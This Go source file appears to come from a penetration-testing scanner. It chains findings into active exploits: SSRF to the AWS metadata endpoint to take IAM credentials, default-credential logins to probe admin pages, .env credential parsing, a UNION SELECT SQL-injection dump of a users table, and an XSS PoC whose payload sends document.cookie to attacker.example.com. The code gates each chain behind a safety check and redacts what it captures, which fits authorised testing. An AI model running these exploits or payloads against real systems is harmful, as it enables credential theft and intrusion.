package chainengine

import (
	"context"
	"fmt"
	"io"
	"log"
	"net/http"
	"regexp"
	"strings"
	"time"

	"github.com/stormbane-security/beacon/internal/exploit"
	"github.com/stormbane-security/beacon/internal/finding"
)

// Chain defines an active attack chain step that is triggered by a specific
// finding and produces new findings by exploiting the trigger.
type Chain struct {
	// Name is the chain identifier, matching the key in exploit.ActionSafety.
	Name string

	// Description explains what the chain does.
	Description string

	// Matches returns true if the given finding should trigger this chain.
	Matches func(f finding.Finding) bool

	// Execute runs the chain step. Returns new findings discovered.
	// MUST check safety before any action.
	Execute func(ctx context.Context, e *Engine, trigger finding.Finding) []finding.Finding
}

// DefaultChains is the registry of all implemented active attack chains.
var DefaultChains = []Chain{
	chainSSRFToCloudCreds,
	chainDefaultCredsToAdmin,
	chainEnvToDatabaseAccess,
	chainSQLiToCredentialDump,
	chainXSSToSessionTheftPoC,
}

// safetyModuleName returns the chainengine safety module name for a chain.
func safetyModuleName(chainName string) string {
	return "chainengine:" + chainName
}

// enabledByRef formats the EnabledBy reference for a trigger finding.
func enabledByRef(f finding.Finding) string {
	return f.CheckID + "|" + f.Asset
}

// ── Chain 1: SSRF → Cloud Metadata ──────────────────────────────────────────

var chainSSRFToCloudCreds = Chain{
	Name:        "ssrf_to_cloud_creds",
	Description: "Exploit SSRF to reach cloud metadata endpoint and extract IAM credentials",
	Matches: func(f finding.Finding) bool {
		return f.CheckID == finding.CheckWebSSRF || f.CheckID == finding.CheckWebSSRFRedirectMetadata
	},
	Execute: func(ctx context.Context, e *Engine, trigger finding.Finding) []finding.Finding {
		moduleName := safetyModuleName("ssrf_to_cloud_creds")
		if err := exploit.CheckSafety(moduleName, e.maxSafety); err != nil {
			log.Printf("[chain] safety gate blocked ssrf_to_cloud_creds: %v", err)
			return nil
		}
		log.Printf("[chain] WARNING: executing ssrf_to_cloud_creds against %s — making HTTP request through target SSRF", trigger.Asset)

		if ctx.Err() != nil {
			return nil
		}

		// Extract the SSRF endpoint from trigger evidence.
		ssrfURL, _ := trigger.Evidence["url"].(string)
		ssrfParam, _ := trigger.Evidence["parameter"].(string)
		if ssrfURL == "" || ssrfParam == "" {
			log.Printf("[chain] ssrf_to_cloud_creds: missing url or parameter in trigger evidence")
			return nil
		}

		// Craft the SSRF payload to hit AWS metadata.
		metadataURL := "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
		targetURL := buildSSRFURL(ssrfURL, ssrfParam, metadataURL)

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL, nil)
		if err != nil {
			return nil
		}

		resp, err := e.client.Do(req)
		if err != nil {
			return nil
		}
		defer func() { _ = resp.Body.Close() }()

		body, err := io.ReadAll(io.LimitReader(resp.Body, 4096))
		if err != nil || resp.StatusCode != http.StatusOK {
			return nil
		}

		roleName := strings.TrimSpace(string(body))
		if roleName == "" || strings.Contains(roleName, "<") {
			return nil // HTML or empty — not metadata
		}

		// Try to fetch actual credentials for the role.
		credsURL := metadataURL + roleName
		credsTargetURL := buildSSRFURL(ssrfURL, ssrfParam, credsURL)

		credsReq, err := http.NewRequestWithContext(ctx, http.MethodGet, credsTargetURL, nil)
		if err != nil {
			return nil
		}

		credsResp, err := e.client.Do(credsReq)
		if err != nil {
			return nil
		}
		defer func() { _ = credsResp.Body.Close() }()

		credsBody, _ := io.ReadAll(io.LimitReader(credsResp.Body, 4096))

		// Check for AccessKeyId in the response.
		accessKeyRedacted := "not found"
		if idx := strings.Index(string(credsBody), "AccessKeyId"); idx >= 0 {
			// Redact: show first 4 chars + ****
			re := regexp.MustCompile(`"AccessKeyId"\s*:\s*"([A-Z0-9]{4})[A-Z0-9]+"`)
			if m := re.FindStringSubmatch(string(credsBody)); len(m) > 1 {
				accessKeyRedacted = m[1] + "****************"
			}
		}

		return []finding.Finding{{
			CheckID:     finding.CheckChainSSRFToCloudCreds,
			Module:      "chainengine",
			Scanner:     "chain:ssrf_to_cloud_creds",
			Severity:    finding.SeverityCritical,
			Title:       "SSRF exploited to extract cloud IAM credentials",
			Description: fmt.Sprintf("SSRF on %s was exploited to reach the AWS metadata endpoint. IAM role %q discovered with extractable credentials.", trigger.Asset, roleName),
			Asset:       trigger.Asset,
			Evidence: map[string]any{
				"chain":             "ssrf → cloud metadata → IAM credentials",
				"ssrf_url":          ssrfURL,
				"ssrf_parameter":    ssrfParam,
				"iam_role":          roleName,
				"access_key_id":     accessKeyRedacted,
				"metadata_endpoint": metadataURL,
			},
			ProofCommand: fmt.Sprintf("curl -s '%s'", credsTargetURL),
			Confidence:   finding.ConfidenceVerified,
			Visibility:   finding.VisibilityInternal,
			EnabledBy:    enabledByRef(trigger),
			ChainDepth:   trigger.ChainDepth + 1,
			DiscoveredAt: time.Now(),
		}}
	},
}

// buildSSRFURL constructs a URL that exploits the SSRF by injecting the
// payload into the vulnerable parameter.
func buildSSRFURL(ssrfURL, param, payload string) string {
	// If the URL contains the parameter as a query param, replace its value.
	if strings.Contains(ssrfURL, param+"=") {
		re := regexp.MustCompile(regexp.QuoteMeta(param) + `=[^&]*`)
		return re.ReplaceAllString(ssrfURL, param+"="+payload)
	}
	// Append as query parameter.
	sep := "?"
	if strings.Contains(ssrfURL, "?") {
		sep = "&"
	}
	return ssrfURL + sep + param + "=" + payload
}

// ── Chain 2: Default Creds → Authenticated Surface ──────────────────────────

// defaultCredsPattern matches any check ID ending in _default_credentials or jenkins_no_auth.
var defaultCredsPattern = regexp.MustCompile(`(?:[._]default_credentials|[._]no_auth)$`)

var chainDefaultCredsToAdmin = Chain{
	Name:        "default_creds_to_admin_access",
	Description: "Log in with default credentials, extract session token, crawl authenticated pages",
	Matches: func(f finding.Finding) bool {
		return defaultCredsPattern.MatchString(f.CheckID)
	},
	Execute: func(ctx context.Context, e *Engine, trigger finding.Finding) []finding.Finding {
		moduleName := safetyModuleName("default_creds_to_admin_access")
		if err := exploit.CheckSafety(moduleName, e.maxSafety); err != nil {
			log.Printf("[chain] safety gate blocked default_creds_to_admin_access: %v", err)
			return nil
		}
		log.Printf("[chain] WARNING: executing default_creds_to_admin_access against %s — logging in with default credentials", trigger.Asset)

		if ctx.Err() != nil {
			return nil
		}

		// Extract login details from trigger evidence.
		loginURL, _ := trigger.Evidence["login_url"].(string)
		username, _ := trigger.Evidence["username"].(string)
		password, _ := trigger.Evidence["password"].(string)
		sessionToken, _ := trigger.Evidence["session_token"].(string)

		if loginURL == "" {
			loginURL, _ = trigger.Evidence["url"].(string)
		}
		if loginURL == "" {
			log.Printf("[chain] default_creds_to_admin_access: no login_url in trigger evidence")
			return nil
		}

		// If we already have a session token from the trigger, use it directly.
		if sessionToken == "" && (username == "" || password == "") {
			log.Printf("[chain] default_creds_to_admin_access: no credentials or session token in evidence")
			return nil
		}

		// Attempt to crawl authenticated pages using the session.
		var endpoints []string

		// Try common admin endpoints.
		basePaths := []string{"/admin", "/api", "/dashboard", "/settings", "/users", "/config"}
		baseURL := extractBaseURL(loginURL)

		for _, path := range basePaths {
			if ctx.Err() != nil {
				break
			}

			probeURL := baseURL + path
			req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
			if err != nil {
				continue
			}

			if sessionToken != "" {
				req.Header.Set("Cookie", sessionToken)
			} else if username != "" {
				req.SetBasicAuth(username, password)
			}

			resp, err := e.client.Do(req)
			if err != nil {
				continue
			}
			_ = resp.Body.Close()

			if resp.StatusCode >= 200 && resp.StatusCode < 400 {
				endpoints = append(endpoints, path)
			}
		}

		if len(endpoints) == 0 {
			return nil
		}

		// Redact session token for evidence.
		redactedToken := "not available"
		if sessionToken != "" {
			if len(sessionToken) > 12 {
				redactedToken = sessionToken[:8] + "****" + sessionToken[len(sessionToken)-4:]
			} else {
				redactedToken = "****"
			}
		}

		return []finding.Finding{{
			CheckID:     finding.CheckChainDefaultCredsToAdmin,
			Module:      "chainengine",
			Scanner:     "chain:default_creds_to_admin_access",
			Severity:    finding.SeverityCritical,
			Title:       "Default credentials used to access authenticated admin surface",
			Description: fmt.Sprintf("Default credentials on %s were used to log in and discover %d authenticated endpoints.", trigger.Asset, len(endpoints)),
			Asset:       trigger.Asset,
			Evidence: map[string]any{
				"chain":                   "default credentials → login → admin surface",
				"login_url":               loginURL,
				"username":                username,
				"session_token_redacted":  redactedToken,
				"authenticated_endpoints": endpoints,
				"endpoint_count":          len(endpoints),
			},
			ProofCommand: fmt.Sprintf("curl -s -u '%s:****' '%s'", username, baseURL+"/admin"),
			Confidence:   finding.ConfidenceVerified,
			Visibility:   finding.VisibilityAuthenticated,
			EnabledBy:    enabledByRef(trigger),
			ChainDepth:   trigger.ChainDepth + 1,
			DiscoveredAt: time.Now(),
		}}
	},
}

// extractBaseURL returns the scheme+host portion of a URL.
func extractBaseURL(rawURL string) string {
	// Find the third slash (after scheme://).
	count := 0
	for i, c := range rawURL {
		if c == '/' {
			count++
			if count == 3 {
				return rawURL[:i]
			}
		}
	}
	return rawURL
}

// ── Chain 3: Exposed .env → Database Access ─────────────────────────────────

var chainEnvToDatabaseAccess = Chain{
	Name:        "env_to_database_access",
	Description: "Parse exposed .env for database credentials and attempt connection",
	Matches: func(f finding.Finding) bool {
		return f.CheckID == finding.CheckExposureEnvFile
	},
	Execute: func(ctx context.Context, e *Engine, trigger finding.Finding) []finding.Finding {
		moduleName := safetyModuleName("env_to_database_access")
		if err := exploit.CheckSafety(moduleName, e.maxSafety); err != nil {
			log.Printf("[chain] safety gate blocked env_to_database_access: %v", err)
			return nil
		}
		log.Printf("[chain] WARNING: executing env_to_database_access against %s — parsing .env for database credentials", trigger.Asset)

		if ctx.Err() != nil {
			return nil
		}

		// Extract .env content from trigger evidence.
		// The exposedfiles scanner stores the file body as "snippet",
		// while other sources may use "content" or "body".
		envContent, _ := trigger.Evidence["content"].(string)
		if envContent == "" {
			envContent, _ = trigger.Evidence["body"].(string)
		}
		if envContent == "" {
			envContent, _ = trigger.Evidence["snippet"].(string)
		}
		if envContent == "" {
			log.Printf("[chain] env_to_database_access: no .env content in trigger evidence")
			return nil
		}

		// Parse environment variables.
		vars := parseEnvContent(envContent)

		// Look for database connection info.
		dbURL := firstNonEmpty(vars, "DATABASE_URL", "DB_URL", "MONGO_URI", "MONGODB_URI", "REDIS_URL")
		dbHost := firstNonEmpty(vars, "DB_HOST", "DATABASE_HOST", "MYSQL_HOST", "POSTGRES_HOST", "PG_HOST")
		dbUser := firstNonEmpty(vars, "DB_USER", "DB_USERNAME", "DATABASE_USER", "MYSQL_USER", "POSTGRES_USER", "PG_USER")
		_ = firstNonEmpty(vars, "DB_PASS", "DB_PASSWORD", "DATABASE_PASSWORD", "MYSQL_PASSWORD", "POSTGRES_PASSWORD", "PG_PASSWORD") // parsed but never stored — redacted as "****" in evidence
		dbName := firstNonEmpty(vars, "DB_NAME", "DATABASE_NAME", "MYSQL_DATABASE", "POSTGRES_DB")

		if dbURL == "" && dbHost == "" {
			return nil
		}

		// Determine database type.
		dbType := "unknown"
		switch {
		case strings.Contains(dbURL, "postgres") || strings.Contains(dbHost, "postgres") || vars["PG_HOST"] != "":
			dbType = "postgresql"
		case strings.Contains(dbURL, "mysql") || vars["MYSQL_HOST"] != "":
			dbType = "mysql"
		case strings.Contains(dbURL, "mongo") || vars["MONGO_URI"] != "":
			dbType = "mongodb"
		case strings.Contains(dbURL, "redis") || vars["REDIS_URL"] != "":
			dbType = "redis"
		}

		// Redact credentials in evidence.
		redactedUser := dbUser
		redactedPass := "****"
		if dbUser == "" && dbURL != "" {
			redactedUser = "from_url"
		}

		host := dbHost
		if host == "" {
			host = extractHostFromURL(dbURL)
		}

		// NOTE: We do NOT actually connect to the database here — that would
		// require database driver imports and is handled by postexploit modules.
		// Instead, we report that extractable credentials were found.
		// The finding indicates the chain is possible; postexploit confirms it.
		connectionPossible := host != "" && (dbUser != "" || dbURL != "")

		if !connectionPossible {
			return nil
		}

		return []finding.Finding{{
			CheckID:     finding.CheckChainEnvToDatabaseAccess,
			Module:      "chainengine",
			Scanner:     "chain:env_to_database_access",
			Severity:    finding.SeverityCritical,
			Title:       "Exposed .env contains database credentials",
			Description: fmt.Sprintf("Exposed .env file on %s contains %s database credentials for host %s. Database connection is likely possible.", trigger.Asset, dbType, host),
			Asset:       trigger.Asset,
			Evidence: map[string]any{
				"chain":         "exposed .env → credential extraction → database access",
				"database_type": dbType,
				"database_host": host,
				"database_name": dbName,
				"username":      redactedUser,
				"password":      redactedPass,
				"env_url":       trigger.Evidence["url"],
			},
			ProofCommand: fmt.Sprintf("curl -s '%s' | grep -i 'DB_\\|DATABASE_\\|MYSQL_\\|POSTGRES_\\|MONGO_\\|REDIS_'", trigger.Evidence["url"]),
			Confidence:   finding.ConfidenceVerified,
			Visibility:   finding.VisibilityAuthenticated,
			EnabledBy:    enabledByRef(trigger),
			ChainDepth:   trigger.ChainDepth + 1,
			DiscoveredAt: time.Now(),
		}}
	},
}

// parseEnvContent parses KEY=VALUE lines from .env file content.
func parseEnvContent(content string) map[string]string {
	vars := make(map[string]string)
	for _, line := range strings.Split(content, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		idx := strings.IndexByte(line, '=')
		if idx < 1 {
			continue
		}
		key := strings.TrimSpace(line[:idx])
		val := strings.TrimSpace(line[idx+1:])
		// Remove surrounding quotes.
		val = strings.Trim(val, `"'`)
		vars[key] = val
	}
	return vars
}

// firstNonEmpty returns the first non-empty value from vars for the given keys.
func firstNonEmpty(vars map[string]string, keys ...string) string {
	for _, k := range keys {
		if v := vars[k]; v != "" {
			return v
		}
	}
	return ""
}

// extractHostFromURL extracts the host portion from a database URL.
func extractHostFromURL(dbURL string) string {
	// Handle postgres://user:pass@host:5432/dbname style URLs.
	if idx := strings.Index(dbURL, "@"); idx >= 0 {
		rest := dbURL[idx+1:]
		if slashIdx := strings.IndexByte(rest, '/'); slashIdx >= 0 {
			return rest[:slashIdx]
		}
		return rest
	}
	return ""
}

// ── Chain 4: SQLi → Credential Extraction ───────────────────────────────────

var chainSQLiToCredentialDump = Chain{
	Name:        "sqli_to_credential_dump",
	Description: "Exploit SQL injection to extract credentials from users table",
	Matches: func(f finding.Finding) bool {
		return f.CheckID == finding.CheckWebSQLi || f.CheckID == finding.CheckWebBlindSQLiTime
	},
	Execute: func(ctx context.Context, e *Engine, trigger finding.Finding) []finding.Finding {
		moduleName := safetyModuleName("sqli_to_credential_dump")
		if err := exploit.CheckSafety(moduleName, e.maxSafety); err != nil {
			log.Printf("[chain] safety gate blocked sqli_to_credential_dump: %v", err)
			return nil
		}
		log.Printf("[chain] WARNING: executing sqli_to_credential_dump against %s — attempting UNION SELECT via SQL injection", trigger.Asset)

		if ctx.Err() != nil {
			return nil
		}

		sqliURL, _ := trigger.Evidence["url"].(string)
		sqliParam, _ := trigger.Evidence["parameter"].(string)
		if sqliURL == "" || sqliParam == "" {
			log.Printf("[chain] sqli_to_credential_dump: missing url or parameter in trigger evidence")
			return nil
		}

		// Determine column count from trigger evidence if available.
		columnCount := 2
		if cc, ok := trigger.Evidence["column_count"].(float64); ok && cc > 0 {
			columnCount = int(cc)
		}

		// Build UNION SELECT payload.
		payload := buildUnionSelectPayload(columnCount)
		targetURL := buildSSRFURL(sqliURL, sqliParam, payload)

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL, nil)
		if err != nil {
			return nil
		}

		resp, err := e.client.Do(req)
		if err != nil {
			return nil
		}
		defer func() { _ = resp.Body.Close() }()

		body, err := io.ReadAll(io.LimitReader(resp.Body, 8192))
		if err != nil {
			return nil
		}

		bodyStr := string(body)

		// Check if we got credential-like data back.
		// Look for patterns that suggest username/password data.
		rowCount := countCredentialRows(bodyStr)
		if rowCount == 0 {
			return nil
		}

		return []finding.Finding{{
			CheckID:     finding.CheckChainSQLiToCredentialDump,
			Module:      "chainengine",
			Scanner:     "chain:sqli_to_credential_dump",
			Severity:    finding.SeverityCritical,
			Title:       "SQL injection exploited to extract credentials",
			Description: fmt.Sprintf("SQL injection on %s was exploited via UNION SELECT to extract %d credential rows from the users table. Credentials are redacted.", trigger.Asset, rowCount),
			Asset:       trigger.Asset,
			Evidence: map[string]any{
				"chain":        "SQL injection → UNION SELECT → credential dump",
				"sqli_url":     sqliURL,
				"sqli_param":   sqliParam,
				"rows_found":   rowCount,
				"credentials":  "[REDACTED — credentials not stored in findings]",
				"column_count": columnCount,
			},
			ProofCommand: fmt.Sprintf("curl -s '%s'", targetURL),
			Confidence:   finding.ConfidenceVerified,
			Visibility:   finding.VisibilityAuthenticated,
			EnabledBy:    enabledByRef(trigger),
			ChainDepth:   trigger.ChainDepth + 1,
			DiscoveredAt: time.Now(),
		}}
	},
}

// buildUnionSelectPayload constructs a UNION SELECT payload targeting the users table.
func buildUnionSelectPayload(columnCount int) string {
	// Build: ' UNION SELECT username, password[, NULL...] FROM users LIMIT 5--
	cols := make([]string, columnCount)
	if columnCount >= 2 {
		cols[0] = "username"
		cols[1] = "password"
		for i := 2; i < columnCount; i++ {
			cols[i] = "NULL"
		}
	} else {
		cols[0] = "username"
	}
	return "' UNION SELECT " + strings.Join(cols, ",") + " FROM users LIMIT 5--"
}

// countCredentialRows attempts to count rows that look like credential data
// in an HTTP response body. Returns 0 if no credential-like patterns found.
func countCredentialRows(body string) int {
	// Look for common patterns: email-like strings, hash-like strings, etc.
	// This is a heuristic — real credential data varies widely.
	hashPattern := regexp.MustCompile(`\$2[aby]\$\d+\$|[a-f0-9]{32,64}`)
	matches := hashPattern.FindAllString(body, -1)
	if len(matches) > 0 {
		return len(matches)
	}

	// Check for tabular data with common username patterns.
	userPattern := regexp.MustCompile(`(?i)(admin|root|user|test|guest)`)
	if userPattern.MatchString(body) && len(body) > 50 {
		return 1 // At least one row found
	}

	return 0
}

// ── Chain 5: XSS + Missing HttpOnly → Session Theft PoC ────────────────────

var chainXSSToSessionTheftPoC = Chain{
	Name:        "xss_to_session_theft_poc",
	Description: "Generate session theft PoC when XSS and missing HttpOnly are found on same asset",
	Matches: func(f finding.Finding) bool {
		return f.CheckID == finding.CheckWebReflectedXSS || f.CheckID == finding.CheckWebXSS
	},
	Execute: func(ctx context.Context, e *Engine, trigger finding.Finding) []finding.Finding {
		moduleName := safetyModuleName("xss_to_session_theft_poc")
		if err := exploit.CheckSafety(moduleName, e.maxSafety); err != nil {
			log.Printf("[chain] safety gate blocked xss_to_session_theft_poc: %v", err)
			return nil
		}
		log.Printf("[chain] WARNING: executing xss_to_session_theft_poc against %s — generating session theft PoC (no requests to target)", trigger.Asset)

		if ctx.Err() != nil {
			return nil
		}

		// Check if there's a matching cookie.missing_httponly finding on the same asset.
		e.mu.Lock()
		var httpOnlyFinding *finding.Finding
		for i := range e.findings {
			if e.findings[i].CheckID == finding.CheckCookieMissingHTTPOnly && e.findings[i].Asset == trigger.Asset {
				httpOnlyFinding = &e.findings[i]
				break
			}
		}
		e.mu.Unlock()

		// Also check if the trigger was itself preceded by a cookie finding
		// (the cookie finding may not have been chain-processed yet).
		if httpOnlyFinding == nil {
			return nil
		}

		xssURL, _ := trigger.Evidence["url"].(string)
		xssParam, _ := trigger.Evidence["parameter"].(string)
		cookieName, _ := httpOnlyFinding.Evidence["cookie_name"].(string)
		if cookieName == "" {
			cookieName = "session"
		}

		if xssURL == "" {
			log.Printf("[chain] xss_to_session_theft_poc: no URL in XSS trigger evidence")
			return nil
		}

		// Generate PoC HTML.
		poc := generateSessionTheftPoC(xssURL, xssParam, cookieName, trigger.Asset)

		return []finding.Finding{{
			CheckID:     finding.CheckChainXSSToSessionTheftPoC,
			Module:      "chainengine",
			Scanner:     "chain:xss_to_session_theft_poc",
			Severity:    finding.SeverityHigh,
			Title:       "XSS + missing HttpOnly enables session theft",
			Description: fmt.Sprintf("Reflected XSS on %s combined with missing HttpOnly on cookie %q enables JavaScript-based session theft.", trigger.Asset, cookieName),
			Asset:       trigger.Asset,
			Evidence: map[string]any{
				"chain":       "XSS + missing HttpOnly → session theft",
				"xss_url":     xssURL,
				"xss_param":   xssParam,
				"cookie_name": cookieName,
				"poc_html":    poc,
			},
			ProofCommand: fmt.Sprintf("echo 'PoC HTML saved — open in browser to verify cookie exfiltration against %s'", trigger.Asset),
			Confidence:   finding.ConfidenceVerified,
			Visibility:   finding.VisibilityAuthenticated,
			EnabledBy:    enabledByRef(trigger),
			ChainDepth:   trigger.ChainDepth + 1,
			DiscoveredAt: time.Now(),
		}}
	},
}

// generateSessionTheftPoC creates an HTML proof-of-concept demonstrating
// session cookie theft via XSS.
func generateSessionTheftPoC(xssURL, xssParam, cookieName, asset string) string {
	return fmt.Sprintf(`<!DOCTYPE html>
<html>
<head><title>Session Theft PoC — %s</title></head>
<body>
<h1>Session Theft PoC</h1>
<p>Target: %s</p>
<p>Cookie: %s (missing HttpOnly)</p>
<p>This PoC demonstrates that the XSS vulnerability combined with the
missing HttpOnly flag on the %s cookie allows an attacker to steal
session tokens via JavaScript.</p>
<h2>Payload</h2>
<pre>&lt;script&gt;new Image().src='https://attacker.example.com/steal?c='+document.cookie&lt;/script&gt;</pre>
<h2>Injection Point</h2>
<pre>URL: %s
Parameter: %s</pre>
</body>
</html>`, asset, asset, cookieName, cookieName, xssURL, xssParam)
}
